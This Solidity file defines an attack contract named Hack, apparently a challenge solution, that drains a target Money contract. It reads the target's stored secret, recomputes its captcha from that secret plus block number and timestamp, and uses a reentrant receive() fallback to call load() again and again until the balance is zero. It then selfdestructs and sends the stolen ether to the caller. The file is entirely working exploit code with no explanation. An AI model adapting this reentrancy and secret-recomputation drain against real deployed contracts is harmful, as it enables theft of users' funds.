pragma solidity ^0.8.0;

import "./Money.sol";
import "./Captcha.sol";

contract Hack {
    Money money;
    uint256 secret;

     constructor(address payable _target)  {
        money = Money(_target);
        secret = money.secret();
    }

    function hack() payable  public {
        require(msg.value == 1 ether, "Need 1 ETH");
        money.save{ value: 1 ether }();
        uint256 captcha = uint256(keccak256(abi.encodePacked(secret, block.number, block.timestamp)));
        money.load(captcha);

        require(address(money).balance == 0, "Contract should be empty");
        selfdestruct(payable(msg.sender));
    }

    receive() external payable { 
        uint amount = min(1 ether, address(money).balance);
        if (amount > 0 ){
                uint256 captcha = uint256(keccak256(abi.encodePacked(secret, block.number, block.timestamp)));
                money.load(captcha);  
        }

    }

    function min(uint x, uint y) public pure returns (uint){
        return x <= y ? x : y; 
    }
}